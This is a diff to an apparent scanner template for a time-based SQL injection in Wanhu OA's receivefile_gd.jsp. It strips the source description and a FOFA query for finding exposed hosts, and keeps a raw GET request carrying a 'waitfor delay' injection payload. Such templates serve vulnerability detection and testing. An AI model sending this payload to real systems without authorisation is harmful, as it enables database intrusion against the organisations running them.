@@ -3,12 +3,8 @@ info:
   name: 万户OA-receivefile_gd.jsp SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uxvvbn5n3f5yloxr'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uxvvbn5n3f5yloxr
-    fofa: app="万户网络-ezOFFICE" || body="/defaultroot/"
 http:
 - raw:
   - 'GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.jsrecordId=1;waitfor+delay+''0:0:6''--+- HTTP/1.1
